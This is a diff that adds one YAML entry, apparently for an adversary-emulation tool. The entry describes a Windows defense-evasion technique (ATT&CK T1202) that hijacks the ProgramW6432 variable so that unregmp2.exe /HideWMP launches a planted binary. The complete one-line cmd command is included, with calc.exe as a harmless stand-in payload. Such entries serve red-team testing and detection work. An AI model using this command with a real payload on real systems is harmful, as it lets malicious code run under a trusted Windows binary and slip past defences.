@@ -1,0 +1,30 @@
+- id: 09e89978-12aa-c2a8-2fab-aca450f49c66
+  name: Unregmp2.exe - Allows an attacker to copy a target binary to a controlled
+    directory and modify the 'ProgramW6432' environment variable to point to that
+    controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which
+    will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.
+  description: Allows an attacker to copy a target binary to a controlled directory
+    and modify the 'ProgramW6432' environment variable to point to that controlled
+    directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn
+    a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1202
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media
+          Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media
+          Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin"
+          && unregmp2.exe /HideWMP"
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Wade Hickey
+  created: '2021-12-06'
+  modified: '2021-12-06'
+  operating_system: Windows All Versions
